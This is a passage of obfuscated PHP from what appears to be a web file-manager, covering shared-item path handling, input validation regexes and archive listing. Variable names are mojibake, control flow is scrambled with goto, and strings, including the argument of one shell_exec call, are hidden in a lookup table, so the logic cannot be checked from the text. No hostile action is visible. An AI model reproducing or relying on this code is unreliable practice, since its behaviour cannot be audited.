$D¿ÏÁõ‘™[33]) { return !1; } $e‡¢òŞ™˜Š = array($D¿ÏÁõ‘™[368] => $Fí¦•…Áö); if ($aï†Ò›¸¼) { return $this->model->listSource($e‡¢òŞ™˜Š, -1); } return $this->model->listSource($e‡¢òŞ™˜Š); } public function has($a„Ï¶Æï†, $CÀÖŒÅ¢¦› = false, $FÙà•„Š·œ = null) { $dñ™¢³Â² =& $_SERVER[¯Ò¬Èè]; $c—Ù‰¢ÄÃÒ = $this->infoWithChildren($a„Ï¶Æï†); if ($CÀÖŒÅ¢¦›) { return array($dñ™¢³Â²[192] => $c—Ù‰¢ÄÃÒ[$dñ™¢³Â²[192]], $dñ™¢³Â²[191] => $c—Ù‰¢ÄÃÒ[$dñ™¢³Â²[191]]); } return $FÙà•„Š·œ ? $c—Ù‰¢ÄÃÒ[$dñ™¢³Â²[192]] : $c—Ù‰¢ÄÃÒ[$dñ™¢³Â²[191]]; } public function listAll($DÓŸØçØÒ) { $E°”‰Š£‘ = IO::info($this->pathParse[$_SERVER[¯Ò¬Èè][75]]); if (!$E°”‰Š£‘) { return array(); } return $this->model->listAll($DÓŸØçØÒ); } public function getContent($dÖ¥‘‚Óˆà) { return $this->model->getContent($dÖ¥‘‚Óˆà); } public function setContent($cÆ¬ä‚˜ìÂ, $A’ÆÔãë Ê = '') { return $this->model->setContent($cÆ¬ä‚˜ìÂ, $A’ÆÔãë Ê); } public function fileSubstr($fğ¿¡°ô”ˆ, $A¦»à„ñ¸Ì, $F‡§æ†İ¾) { return $this->model->fileSubstr($fğ¿¡°ô”ˆ, $A¦»à„ñ¸Ì, $F‡§æ†İ¾); } public function download($AÌ— ·Ğ»’, $aŒ÷×ä¢Í¬ = '') { $E¸š¾…í™ = get_path_father($aŒ÷×ä¢Í¬); $EšøÅ¸—¾ì = get_path_this($aŒ÷×ä¢Í¬); $F‹¥«Ÿ„„ = $this->model->fileInfoGet($AÌ— ·Ğ»’); $fËÑçÑ—“’ = IO::copy($F‹¥«Ÿ„„[$_SERVER[¯Ò¬Èè][75]], $E¸š¾…í™, !1, $EšøÅ¸—¾ì); return $fËÑçÑ—“’; } public function upload($cÜ«¥¢Ò×Ê, $Dƒà£‰† ò, $Eõ¥ëƒŞ©š = false, $AªØ­Úö· = REPEAT_REPLACE) { $e±†À§ ¤ =& $_SERVER[¯Ò¬Èè]; $E…¶»„â‚ = $this->parse($cÜ«¥¢Ò×Ê); $Eô¸áó¯ª = $this->model->addFile($E…¶»„â‚[$e±†À§ ¤[367]], $Dƒà£‰† ò, $E…¶»„â‚[$e±†À§ ¤[75]], $Eõ¥ëƒŞ©š, $AªØ­Úö·); return $this->getPathOuter($Eô¸áó¯ª); } public function uploadFileByID($AĞ†£š×šÅ, $F˜£ßİÈ¬õ, $b•„•‹–î·) { $Cİƒ•¦èšÍ =& $_SERVER[¯Ò¬Èè]; $bÆõªˆÎù‚ = $this->parse($AĞ†£š×šÅ); $bç¯Ö–½ = $this->model->addFileByFileID($bÆõªˆÎù‚[$Cİƒ•¦èšÍ[367]], $F˜£ßİÈ¬õ, $bÆõªˆÎù‚[$Cİƒ•¦èšÍ[75]], $b•„•‹–î·); return $this->getPathOuter($bç¯Ö–½); } public function addFileByRemote($D‚öáÜ¸ã, $FÉÀÌ¦Ã¯¤, $B°ó°½ = array(), $e™Ã“¤÷ÀÉ = '', $D•çñç’Àù) { $fĞ‘¹ÕÌ‚É =& $_SERVER[¯Ò¬Èè]; $c›Ù»Ûêä÷ = $this->parse($D‚öáÜ¸ã); $e™Ã“¤÷ÀÉ = empty($e™Ã“¤÷ÀÉ) ? $c›Ù»Ûêä÷[$fĞ‘¹ÕÌ‚É[75]] : $e™Ã“¤÷ÀÉ; $a»Äëù±çŞ = $this->model->addFileByRemote($c›Ù»Ûêä÷[$fĞ‘¹ÕÌ‚É[367]], $FÉÀÌ¦Ã¯¤, $e™Ã“¤÷ÀÉ, $B°ó°½, $D•çñç’Àù); return $this->getPathOuter($a»Äëù±çŞ); } public function uploadLink($d¤Œ¡Ë³ö, $cÅóÏÒŸ›Ò = 0) { $c ›Áæà =& $_SERVER[¯Ò¬Èè]; $Aªö¾¯¸İ = $this->parse($d¤Œ¡Ë³ö); $d¤Œ¡Ë³ö = Model($c ›Áæà[553])->createFileName($Aªö¾¯¸İ[$c ›Áæà[75]]); $EÉõØºå¸¿ = IO::uploadLink($d¤Œ¡Ë³ö, $cÅóÏÒŸ›Ò); return $EÉõØºå¸¿; } public function fileNameAuto($AáÏš•ï, $fßˆŠÌ¬‡ƒ, $eÕ‡ôó†‹ = REPEAT_REPLACE, $a¾©¦ÀÒ’ = false) { return $this->model->fileNameAuto($AáÏš•ï, $fßˆŠÌ¬‡ƒ, $eÕ‡ôó†‹, $a¾©¦ÀÒ’); } public function fileNameExist($Fˆƒ²Œ×, $aùÚ‚Œóª¤) { return $this->model->fileNameExist($Fˆƒ²Œ×, $aùÚ‚Œóª¤); } protected function _fileOut($b–Ç²“±İİ, $A·ä¶İ¼äÙ = false, $dƒÈ…£«Àò = false, $C­×Óä‚À = '', $dŸÃì³·Ç¥ = false) { goto bå—˜âµÆÏ; bå—˜âµÆÏ: $BËè‰Å²¢Ö =& $_SERVER[¯Ò¬Èè]; $Fœäì·»‡ô = $this->model->sourceInfo($b–Ç²“±İİ); if ($Fœäì·»‡ô[$BËè‰Å²¢Ö[370]] == $BËè‰Å²¢Ö[83]) { header($BËè‰Å²¢Ö[1128]); die; } goto DÜÒ™š·®¬; Cà£—†›ùË: if ($dŸÃì³·Ç¥) { return IO::fileOutServer($bí°ƒß¶›[$BËè‰Å²¢Ö[75]], $A·ä¶İ¼äÙ, $d†ÔÛœÁØ, $C­×Óä‚À); } IO::fileOut($bí°ƒß¶›[$BËè‰Å²¢Ö[75]], $A·ä¶İ¼äÙ, $d†ÔÛœÁØ, $C­×Óä‚À); goto dˆä»ä—È„; DÜÒ™š·®¬: $bí°ƒß¶› = $this->model->fileInfoGet($b–Ç²“±İİ); $C­×Óä‚À = $bí°ƒß¶›[$BËè‰Å²¢Ö[163]] ? $bí°ƒß¶›[$BËè‰Å²¢Ö[163]] : $C­×Óä‚À; $d†ÔÛœÁØ = isset($GLOBALS[$BËè‰Å²¢Ö[1129]]) ? $GLOBALS[$BËè‰Å²¢Ö[1129]] : $Fœäì·»‡ô[$BËè‰Å²¢Ö[28]]; goto Cà£—†›ùË; dˆä»ä—È„: } public function fileOut($C™çòç°ğ, $D¢ê¥òá… = false, $a†Óà­ÌìÕ = false, $Eïõ Óèíø = '') { $this->_fileOut($C™çòç°ğ, $D¢ê¥òá…, $a†Óà­ÌìÕ, $Eïõ Óèíø); } public function fileOutServer($cÊÔ˜©‚­, $c»Ò–â ‰Ü = false, $EÑˆ½‡£Ã = false, $AÔÌ¬¯×ˆ¿ = '') { $this->_fileOut($cÊÔ˜©‚­, $c»Ò–â ‰Ü, $EÑˆ½‡£Ã, $AÔÌ¬¯×ˆ¿, !0); } protected function _fileOutImage($dµó§ª„¾×, $Cº¦ÀÃµ = 250) { $cˆöõ§Ç =& $_SERVER[¯Ò¬Èè]; $c‹†Ã‡ã©¼ = $this->model->sourceInfo($dµó§ª„¾×); if ($c‹†Ã‡ã©¼[$cˆöõ§Ç[370]] == $cˆöõ§Ç[83]) { show_json($cˆöõ§Ç[1130] . $dµó§ª„¾×, !1); } $GLOBALS[$cˆöõ§Ç[1129]] = $c‹†Ã‡ã©¼[$cˆöõ§Ç[28]]; $E¥ƒô³¿ = $this->model->fileInfoGet($dµó§ª„¾×); IO::fileOutImage($E¥ƒô³¿[$cˆöõ§Ç[75]], $Cº¦ÀÃµ); } public function fileOutImage($b†Á¸²éî, $F°Š×Ù¥‘ = 250) { $this->_fileOutImage($b†Á¸²éî, $F°Š×Ù¥‘); } public function fileOutImageServer($Då†«Ö¼„È, $DŞ™–ó±Ü = 250) { $this->_fileOutImage($Då†«Ö¼„È, $DŞ™–ó±Ü); } public function link($C˜¾ë™¼°, $c„Ëµ“ì‹Æ = '') { $f„‚¾Óà½ñ = $this->model->fileInfoGet($C˜¾ë™¼°); return IO::link($f„‚¾Óà½ñ[$_SERVER[¯Ò¬Èè][75]], $c„Ëµ“ì‹Æ); } protected function parse($bŞ¥‰£ğŞ) { $c°Å°åôĞ =& $_SERVER[¯Ò¬Èè]; if (strstr($bŞ¥‰£ğŞ, $c°Å°åôĞ[8]) === !1) { return array($c°Å°åôĞ[385] => intval($bŞ¥‰£ğŞ), $c°Å°åôĞ[75] => $c°Å°åôĞ[33], $c°Å°åôĞ[1127] => array()); } $câøÒ÷šå = explode($c°Å°åôĞ[8], trim($bŞ¥‰£ğŞ, $c°Å°åôĞ[8])); if (count($câøÒ÷šå) < 2) { show_tips($bŞ¥‰£ğŞ . $c°Å°åôĞ[1131]); } return array($c°Å°åôĞ[385] => intval($câøÒ÷šå[0]), $c°Å°åôĞ[75] => $câøÒ÷šå[1], $c°Å°åôĞ[1127] => array_slice($câøÒ÷šå, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($bˆÇ¤ùŞº) { $this->pathParse = $bˆÇ¤ùŞº; $this->model = Model($_SERVER[¯Ò¬Èè][1126]); } public function getPathOuter($eÒÑ•éğ—) { $dŞï†ßÕÛ  =& $_SERVER[¯Ò¬Èè]; if (!$eÒÑ•éğ—) { return $eÒÑ•éğ—; } $dÙØòÅ Ì… = $this->parse($eÒÑ•éğ—); return trim(KodIO::makeShare($this->pathParse[$dŞï†ßÕÛ [367]], $dÙØòÅ Ì…[$dŞï†ßÕÛ [367]]), $dŞï†ßÕÛ [8]); } protected function infoParse($e³åÜ£²‰¶, $b¡Ó‡é÷Ï‹ = false, $BÖåÁ„¤Àø = false) { $FÙÂÖŒ±„Î =& $_SERVER[¯Ò¬Èè]; $E†«‚»‰Ÿ = $this->pathParse[$FÙÂÖŒ±„Î[367]]; $aˆ†‚À»º = trim($this->pathParse[$FÙÂÖŒ±„Î[1021]], $FÙÂÖŒ±„Î[8]); return Action($FÙÂÖŒ±„Î[1132])->sharePathInfo($E†«‚»‰Ÿ, $aˆ†‚À»º); } public function infoFull($B¹¯†Ö¶õš) { $d™’«¾Ä =& $_SERVER[¯Ò¬Èè]; $B¯–­ÑÓª = explode($d™’«¾Ä[8], trim($B¹¯†Ö¶õš, $d™’«¾Ä[8])); if (count($B¯–­ÑÓª) > 1) { $EïÇóŞÈº = implode($d™’«¾Ä[8], array_splice($B¯–­ÑÓª, 1)); $CÉàÛï–Ô = $this->model->pathInfoByPath($B¯–­ÑÓª[0], $EïÇóŞÈº); if (!$CÉàÛï–Ô) { return !1; } $this->pathParse[$d™’«¾Ä[1021]] = $CÉàÛï–Ô[$d™’«¾Ä[369]]; } return $this->infoParse($B¹¯†Ö¶õš); } public function listAll($b›ö…¤ËïÇ) { goto CƒÈèôÎ”; cÜ‹ÓËŠ˜‚: $E„Ø™‡ÎÄ = $this->model->listAll($b›ö…¤ËïÇ); $D¢šä”à’ = Model($DãğÚó®ë[545])->getInfo($B˜‰æîêÛ[$DãğÚó®ë[441]]); $F‘ï¹ÂŒ÷ = Action($DãğÚó®ë[1132]); goto Cï™¹»Ã±; Cï™¹»Ã±: foreach ($E„Ø™‡ÎÄ as &$a´™œƒˆ) { check_abort(); $a´™œƒˆ[$DãğÚó®ë[391]] = $F‘ï¹ÂŒ÷->_shareItemeParse($a´™œƒˆ[$DãğÚó®ë[391]], $D¢šä”à’); } return $E„Ø™‡ÎÄ; goto eÈíÉ•Ğ›Š; CƒÈèôÎ”: $DãğÚó®ë =& $_SERVER[¯Ò¬Èè]; $B˜‰æîêÛ = IO::info($this->pathParse[$DãğÚó®ë[75]]); if (!$B˜‰æîêÛ) { return array(); } goto cÜ‹ÓËŠ˜‚; eÈíÉ•Ğ›Š: } } goto DÓğ¥¢ÚÌß; dî‰õÚÏø: if (!function_exists($_SERVER[¯Ò¬Èè][1885])) { function imagecreatefrombmp($d˜´àã–‘…) { return ImageGdBMP::load($d˜´àã–‘…); } } class Input { public static function getArray($CŒçµ”‡ì¼) { goto dç‚½ˆÀöÖ; C´‘ß‰‡Ó: $A†­ß‹Ââ„ = array(); $DÊå¹˜­×¬ = LNG($Bçòà‘˜„ñ[1886]); foreach ($CŒçµ”‡ì¼ as $Fë©‡Õ„Šñ => $A÷‚Ë—¯¦Ù) { goto E‰ø‘«îÆİ; BÃ§ëîĞ–: if (!array_key_exists($Fë©‡Õ„Šñ, $in)) { if (array_key_exists($Bçòà‘˜„ñ[1888], $A÷‚Ë—¯¦Ù)) { if (!is_null($A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1888]])) { $aÔï–¦Á¶›[$cİÚ‹³‘×Œ] = $A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1888]]; } } else { if (isset($A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1889]])) { $A†­ß‹Ââ„[] = $Aëò„î°ò; } } continue; } if (isset($A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1889]]) && $A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1889]] == $Bçòà‘˜„ñ[282]) { $FÎí›ö˜§å = json_decode($in[$Fë©‡Õ„Šñ], !0); if (is_array($FÎí›ö˜§å)) { $aÔï–¦Á¶›[$cİÚ‹³‘×Œ] = $FÎí›ö˜§å; } else { if (array_key_exists($Bçòà‘˜„ñ[1888], $A÷‚Ë—¯¦Ù)) { if (!is_null($A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1888]])) { $aÔï–¦Á¶›[$cİÚ‹³‘×Œ] = $A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1888]]; } } else { $A†­ß‹Ââ„[] = $Aëò„î°ò; } } continue; } $b¡©ŠÔ½‹’ = _get($A÷‚Ë—¯¦Ù, $Bçòà‘˜„ñ[1021]); goto FìŠŠÍ–; E‰ø‘«îÆİ: $Aëò„î°ò = _get($A÷‚Ë—¯¦Ù, $Bçòà‘˜„ñ[1254], $DÊå¹˜­×¬ . $Bçòà‘˜„ñ[889] . $Fë©‡Õ„Šñ); $cİÚ‹³‘×Œ = $Fë©‡Õ„Šñ; if (isset($A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1887]]) && $A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1887]]) { $cİÚ‹³‘×Œ = $A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1887]]; } goto BÃ§ëîĞ–; FìŠŠÍ–: if (isset($A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1889]]) && !self::check($in[$Fë©‡Õ„Šñ], $A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1889]], $b¡©ŠÔ½‹’)) { if (array_key_exists($Bçòà‘˜„ñ[1888], $A÷‚Ë—¯¦Ù)) { if (!is_null($A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1888]])) { $aÔï–¦Á¶›[$cİÚ‹³‘×Œ] = $A÷‚Ë—¯¦Ù[$Bçòà‘˜„ñ[1888]]; } } else { $A†­ß‹Ââ„[] = $Aëò„î°ò; } continue; } $aÔï–¦Á¶›[$cİÚ‹³‘×Œ] = $in[$Fë©‡Õ„Šñ]; goto a™„Øœß††; a™„Øœß††: } goto Bæ¨Õİ®©‚; Bæ¨Õİ®©‚: if (count($A†­ß‹Ââ„) > 0) { show_json(implode($Bçòà‘˜„ñ[1890], $A†­ß‹Ââ„), !1); } return $aÔï–¦Á¶›; goto c‰ğöŸÄ; dç‚½ˆÀöÖ: $Bçòà‘˜„ñ =& $_SERVER[¯Ò¬Èè]; global $in; $aÔï–¦Á¶› = array(); goto C´‘ß‰‡Ó; c‰ğöŸÄ: } public static function reg($AÕàë«Œ›½ = "\162\145\x71\x75\x69\162\x65") { static $AÙ²¦¾İ» = array("\x72\145\x71\x75\x69\162\145" => "\56\x2b", "\x6e\x75\x6d\142\145\162" => "\134\x64\53", "\150\x65\170" => "\x5b\60\55\x39\101\55\x46\x61\x2d\x66\135\53", "\x69\156\x74" => "\133\x2d\134\x2b\135\x3f\134\144\x2b", "\x62\157\157\x6c" => "\60\174\x31", "\146\154\157\141\164" => "\x5b\55\134\53\x5d\x3f\134\144\x2b\50\x5c\56\134\x64\53\51\77", "\145\156\x67\x6c\x69\163\150" => "\x5b\101\x2d\132\x61\55\x7a\40\x5d\x2b", "\143\x68\x69\x6e\145\163\x65" => "\x5b\134\170\173\x34\145\60\x30\175\55\x5c\x78\x7b\x39\x66\141\65\175\135\x2b", "\150\x61\163\103\x68\151\156\145\163\145" => "\x2f\50\x5b\x5c\x78\173\64\x65\60\60\x7d\55\134\170\x7b\71\x66\x61\65\175\x5d\x2b\x29\x2f\165", "\x65\x6d\x61\x69\154" => "\x5c\x77\x2b\x28\133\x5c\x2e\134\55\x5d\134\167\53\x29\52\134\100\134\167\x2b\50\x5b\134\56\x5c\x2d\x5d\134\167\53\x29\x2a\134\x2e\134\167\x2b", "\x70\x68\x6f\156\x65" => "\x31\x5b\63\x2d\x39\135\x5c\144\173\x39\175", "\x74\145\154\160\x68\x6f\x6e\145" => "\50\x5c\x28\134\x64\x7b\x33\54\x34\x7d\134\51\x7c\x5c\x64\x7b\x33\54\x34\175\x2d\x7c\x5c\163\51\x3f\134\144\x7b\67\x2c\61\64\175", "\165\162\154" => "\x28\150\164\164\160\x7c\146\x74\160\174\x68\164\164\x70\163\x29\72\134\57\x5c\x2f\x5b\x5c\x77\x5c\55\x5f\135\x2b\x28\x5c\x2e\x5b\x5c\x77\x5c\55\137\x5d\53\x29\x2b\50\x5b\x5c\x77\134\55\134\56\x2c\x40\x3f\136\75\45\x26\72\134\57\x7e\x5c\53\43\x5d\52\x5b\x5c\x77\x5c\x2d\134\100\77\x5e\75\45\x26\x5c\x2f\176\x5c\x2b\43\135\x29\x3f", "\165\x72\154\106\x75\154\154" => "\x5b\141\x2d\x7a\x41\55\172\135\x2b\72\x5c\x2f\x5c\57\133\x5e\x5c\163\135\x2a", "\x69\160" => "\x28\134\x64\173\x31\54\63\175\134\56\51\173\63\x7d\x28\x5c\144\173\61\x2c\63\175\51", "\x7a\x69\x70" => "\133\61\55\71\x5d\x5c\144\x7b\x35\x7d\x28\x3f\x21\134\x64\51", "\151\x64\103\141\162\x64" => "\50\134\144\x7b\61\65\x7d\x29\174\x28\134\x64\x7b\61\x37\175\50\x5c\x64\174\130\x7c\170\51\x29", "\x63\x6f\154\157\x72" => "\43\50\133\60\x2d\x39\x41\x2d\106\141\55\x66\135\173\x33\175\174\133\x30\x2d\71\x41\55\106\x61\55\146\x5d\173\66\x7d\x29", "\164\x69\x6d\x65" => "\50\133\x30\55\61\135\134\x64\174\62\133\60\x2d\x34\x5d\51\72\133\60\x2d\65\135\134\x64", "\144\x61\x74\145" => "\134\x64\173\64\175\x5b\55\134\57\135\77\50\x30\x5b\61\55\x39\x5d\x7c\61\133\x30\x2d\62\135\51\x5b\x2d\134\57\x5d\77\x28\x5b\x30\55\x32\135\x5c\x64\174\63\x5b\x30\x2d\x31\135\x29", "\144\141\x74\x65\124\151\155\x65" => "\134\144\x7b\x34\x7d\133\x2d\x5c\57\135\x3f\x28\x30\x5b\x31\55\x39\135\174\x31\x5b\x30\55\x32\x5d\51\x5b\x2d\x5c\x2f\135\77\50\133\60\x2d\62\x5d\134\x64\x7c\x33\133\60\x2d\61\x5d\51\x5c\x73\x2b\50\x5b\60\55\x31\x5d\x5c\x64\174\62\133\x30\55\x34\135\51\x3a\x5b\x30\x2d\x35\x5d\134\x64", "\160\141\x73\163\167\157\162\x64" => "\50\77\x3d\56\52\134\144\51\x28\x3f\x3d\56\x2a\x5b\141\55\172\x5d\x29\50\x3f\x3d\56\x2a\133\101\55\x5a\x5d\x29\x2e\x7b\x38\54\62\x30\x7d", "\x6b\x65\x79" => "\133\101\55\132\141\55\172\x30\x2d\x39\x5f\x5c\55\x5c\x2e\135\x2b", "\x6b\x65\171\x46\165\x6c\x6c" => "\133\x41\x2d\x5a\x61\x2d\x7a\60\55\71\137\x5c\x2d\134\x2e\x5c\x73\54\x5d\53"); if (!$AÕàë«Œ›½) { return $AÙ²¦¾İ»; } return $AÙ²¦¾İ»[$AÕàë«Œ›½]; } public static function check($B–ñ¤îÃ©, $A³¦¢Ø­ğ, $FèôíÌçâ = null) { $Eˆ¬Ø„í£ó =& $_SERVER[¯Ò¬Èè]; switch ($A³¦¢Ø­ğ) { case $Eˆ¬Ø„í£ó[7]: return in_array($B–ñ¤îÃ©, $FèôíÌçâ); break; case $Eˆ¬Ø„í£ó[1891]: return floatval($B–ñ¤îÃ©) > $FèôíÌçâ; break; case $Eˆ¬Ø„í£ó[1892]: return floatval($B–ñ¤îÃ©) < $FèôíÌçâ; break; case $Eˆ¬Ø„í£ó[325]: return strlen($B–ñ¤îÃ©) >= $FèôíÌçâ[0] && strlen($B–ñ¤îÃ©) <= $FèôíÌçâ[1]; break; case $Eˆ¬Ø„í£ó[325]: if (is_array($FèôíÌçâ)) { return strlen($B–ñ¤îÃ©) >= $FèôíÌçâ[0] && strlen($B–ñ¤îÃ©) <= $FèôíÌçâ[1]; break; } else { return strlen($B–ñ¤îÃ©) == $FèôíÌçâ; break; } case $Eˆ¬Ø„í£ó[321]: return floatval($B–ñ¤îÃ©) >= $FèôíÌçâ[0] && floatval($B–ñ¤îÃ©) <= $FèôíÌçâ[1]; break; } $b“ğ˜àÑæø = self::reg(!1); $A³¦¢Ø­ğ = isset($b“ğ˜àÑæø[$A³¦¢Ø­ğ]) ? $b“ğ˜àÑæø[$A³¦¢Ø­ğ] : $A³¦¢Ø­ğ; if (substr($A³¦¢Ø­ğ, 0, 1) != $Eˆ¬Ø„í£ó[8]) { $A³¦¢Ø­ğ = $Eˆ¬Ø„í£ó[1893] . $A³¦¢Ø­ğ . $Eˆ¬Ø„í£ó[1894]; } return preg_match($A³¦¢Ø­ğ, $B–ñ¤îÃ©) === 1; } public static function get($dãã¶‹…ùø, $C’ñÀ·§Úˆ = null, $B²¥ÉÇí£– = null, $Bá‘îô¿š‘ = null) { goto A§µÒ°Ü£; A§µÒ°Ü£: $c……ĞÎá =& $_SERVER[¯Ò¬Èè]; $b‡ŒØµ‡× = array(); if (!is_null($B²¥ÉÇí£–)) { $b‡ŒØµ‡×[$c……ĞÎá[34]] = $B²¥ÉÇí£–; } goto a„‘êƒä; DÓİµÚÕ†å: return $cÇë¾àšÜ±[$dãã¶‹…ùø]; goto C›Äô“Éè; a„‘êƒä: if (!is_null($Bá‘îô¿š‘)) { $b‡ŒØµ‡×[$c……ĞÎá[1021]] = $Bá‘îô¿š‘; } if (!is_null($C’ñÀ·§Úˆ)) { $b‡ŒØµ‡×[$c……ĞÎá[1889]] = $C’ñÀ·§Úˆ; } $cÇë¾àšÜ± = Input::getArray(array($dãã¶‹…ùø => $b‡ŒØµ‡×)); goto DÓİµÚÕ†å; C›Äô“Éè: } } class KodArchive { static function init() { goto fïæÁÀåö; Fªó¼·ëÎ‡: define($d¶Ø÷ÉíÛ[1897], TEMP_FILES); define($d¶Ø÷ÉíÛ[1898], TEMP_FILES); define($d¶Ø÷ÉíÛ[1899], $d¶Ø÷ÉíÛ[1900]); goto cš³¼æÑµÂ; fïæÁÀåö: $d¶Ø÷ÉíÛ =& $_SERVER[¯Ò¬Èè]; if (defined($d¶Ø÷ÉíÛ[1895])) { return; } define($d¶Ø÷ÉíÛ[1895], SDK_DIR . $d¶Ø÷ÉíÛ[1896]); goto Fªó¼·ëÎ‡; cš³¼æÑµÂ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $d¶Ø÷ÉíÛ[1901]; require_once ARCHIVE_LIB . $d¶Ø÷ÉíÛ[1902]; goto cì°¥çäæ; cì°¥çäæ: require_once ARCHIVE_LIB . $d¶Ø÷ÉíÛ[1903]; require_once ARCHIVE_LIB . $d¶Ø÷ÉíÛ[1904]; require_once ARCHIVE_LIB . $d¶Ø÷ÉíÛ[1905]; goto Dô¹‚¼Ğ´Ç; Dô¹‚¼Ğ´Ç: require_once ARCHIVE_LIB . $d¶Ø÷ÉíÛ[1906]; goto E¥ÀÔóÍ’³; E¥ÀÔóÍ’³: } static function checkIfType($f§Ş³›ˆÑ, $BŒäº°ï‰) { goto FŞ²ô¬Â¡“; b…±«Ò‰Ô©: $dŞ‡Ÿ¾ÕÌâ = in_array($f§Ş³›ˆÑ, $Aˆµæ»®À¤[$BŒäº°ï‰]); if ($dŞ‡Ÿ¾ÕÌâ && ($BŒäº°ï‰ == $E´ÂŞ…ƒ¿[301] || $BŒäº°ï‰ == $E´ÂŞ…ƒ¿[1910]) && (!function_exists($E´ÂŞ…ƒ¿[1918]) || !function_exists($E´ÂŞ…ƒ¿[1919]))) { show_tips($E´ÂŞ…ƒ¿[1920]); } if ($dŞ‡Ÿ¾ÕÌâ && $BŒäº°ï‰ == $E´ÂŞ…ƒ¿[1054] && (!function_exists($E´ÂŞ…ƒ¿[1921]) || !strstr(shell_exec($E´ÂŞ…ƒ¿[1922]), $E´ÂŞ…ƒ¿[1923]))) { show_tips($E´ÂŞ…ƒ¿[1924]); } goto fÛ«²…ÂÙ†; fÛ«²…ÂÙ†: return $dŞ‡Ÿ¾ÕÌâ; goto EØÇÊñ³†; FŞ²ô¬Â¡“: $E´ÂŞ…ƒ¿ =& $_SERVER[¯Ò¬Èè]; self::init(); $Aˆµæ»®À¤ = array($E´ÂŞ…ƒ¿[301] => array($E´ÂŞ…ƒ¿[301], $E´ÂŞ…ƒ¿[1907], $E´ÂŞ…ƒ¿[1908], $E´ÂŞ…ƒ¿[1909]), $E´ÂŞ…ƒ¿[1910] => array($E´ÂŞ…ƒ¿[1910], $E´ÂŞ…ƒ¿[1911], $E´ÂŞ…ƒ¿[1052], $E´ÂŞ…ƒ¿[1050]), $E´ÂŞ…ƒ¿[1054] => array($E´ÂŞ…ƒ¿[1054], $E´ÂŞ…ƒ¿[1912], $E´ÂŞ…ƒ¿[1913], $E´ÂŞ…ƒ¿[1914], $E´ÂŞ…ƒ¿[1915], $E´ÂŞ…ƒ¿[1916], $E´ÂŞ…ƒ¿[1917])); goto b…±«Ò‰Ô©; EØÇÊñ³†: } static function listContent($b’¯ãìí®¦, $c³ÕŠˆ”ˆ• = true) { $D»ÙÁŠÍŞ =& $_SERVER[¯Ò¬Èè]; self::init(); $fõ¶¢İ¬´œ = !empty($GLOBALS[$D»ÙÁŠÍŞ[1058]]) ? $GLOBALS[$D»ÙÁŠÍŞ[1058]] : get_path_ext($b’¯ãìí®¦); $EÒä§ô”ƒ = !1; if (self::checkIfType($fõ¶¢İ¬´œ, $D»ÙÁŠÍŞ[1910])) { $a‘•Ï×™± = PclTarList($b’¯ãìí®¦, $fõ¶¢İ¬´œ); $EÒä§ô”ƒ = array(); for ($B¸ä¯›äÖî = 0; $B¸ä¯›äÖî < count($a‘•Ï×™±); $B¸ä¯›äÖî++) { $dÂ‰ÈÆ®Ùß = $a‘•Ï×™±[$B¸ä¯›äÖî]; if ($dÂ‰ÈÆ®Ùß[$D»ÙÁŠÍŞ[1925]] == $D»ÙÁŠÍŞ[1926] || $dÂ‰ÈÆ®Ùß[$D»ÙÁŠÍŞ[1925]] == $D»ÙÁŠÍŞ[1927]) { continue; } if ($c³ÕŠˆ”ˆ•) { $dÂ‰ÈÆ®Ùß[$D»ÙÁŠÍŞ[1928]] = ltrim($dÂ‰ÈÆ®Ùß[$D»ÙÁŠÍŞ[1928]], $D»ÙÁŠÍŞ[1163]); } if ($dÂ‰ÈÆ®Ùß[$D»ÙÁŠÍŞ[1925]] == $D»ÙÁŠÍŞ[1929]) { $dÂ‰ÈÆ®Ùß[$D»ÙÁŠÍŞ[76]] = !0; } else { $dÂ‰ÈÆ®Ùß[$D»ÙÁŠÍŞ[76]] = !1; } $dÂ‰ÈÆ®Ùß[$D»ÙÁŠÍŞ[1045]] = $B¸ä¯›äÖî; $EÒä§ô”ƒ[] = $dÂ‰ÈÆ®Ùß; } } else { if (self::checkIfType($fõ¶¢İ¬´œ, $D»ÙÁŠÍŞ[1054])) { $F‹ˆ£¦ï½ = kodRarArchive::listContent($b’¯ãìí®¦); if (!$F‹ˆ£¦ï½[$D»ÙÁŠÍŞ[1041]]) { return $F‹ˆ£¦ï½; } else { $EÒä§ô”ƒ = $F‹ˆ£¦ï½[$D»ÙÁŠÍŞ[1043]]; } } else { if (kodZipArchive::support($D»ÙÁŠÍŞ[354])) { $EÒä§ô”ƒ = kodZipArchive::listContent($b’¯ãìí®¦); } else { $aÎäÖõæà“ = new PclZip($b’¯ãìí®¦); $EÒä§ô”ƒ = $aÎäÖõæà“->listContent(); } } } if ($EÒä§ô”ƒ) { $cã¢ñ‘½ã = unzip_charset_get($EÒä§ô”ƒ); $c³ÕŠˆ”ˆ• = $c³ÕŠˆ”ˆ• && function_exists($D»ÙÁŠÍŞ[65]); for ($B¸ä¯›äÖî = 0; $B¸ä¯›äÖî < count($EÒä§ô”ƒ); $B¸ä¯›äÖî++) { $EÒä§ô”ƒ[$B¸ä¯›äÖî][$D»ÙÁŠÍŞ[1928]] = str_replace(array($D»ÙÁŠÍŞ[1081], $D»ÙÁŠÍŞ[1930]), $D»ÙÁŠÍŞ[778], $EÒä§ô”ƒ[$B¸ä¯›äÖî][$D»ÙÁŠÍŞ[1928]]); if ($c³ÕŠˆ”ˆ•) { $EÒä§ô”ƒ[$B¸ä¯›äÖî][$D»ÙÁŠÍŞ[1928]] = iconv_to($EÒä§ô”ƒ[$B¸ä¯›äÖî][$D»ÙÁŠÍŞ[1928]], $cã¢ñ‘½ã, $D»ÙÁŠÍŞ[326]); unset($EÒä§ô”ƒ[$B¸ä¯›äÖî][$D»ÙÁŠÍŞ[1931]]); } } return 